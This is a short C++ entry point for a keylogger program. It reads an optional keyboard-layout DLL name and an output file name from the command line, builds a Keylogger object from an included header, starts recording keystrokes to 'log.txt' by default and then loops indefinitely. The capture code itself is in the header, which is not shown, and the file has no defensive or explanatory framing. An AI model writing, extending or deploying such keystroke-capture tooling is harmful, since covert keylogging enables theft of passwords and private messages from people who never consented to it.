#include "keylogger.h"
#include <string>

int main(int argc, char** argv) {
	const char* dll = "KBDUSX";
	const char* file = "log.txt";

	for (size_t i = 0; i < argc; i++) {
		std::string arg = argv[i];
		if (arg == "--dllname" || arg == "-d") {
			dll = argv[++i];
			continue;
		}
		if (arg == "--output" || arg == "-o") {
			file = argv[++i];
			continue;
		}
	}

	Keylogger keyboard(dll, file);

	keyboard.startKeylog();

	while (true) {
		std::this_thread::sleep_for(keyboard.polling);
	}

	keyboard.stopKeylog();
}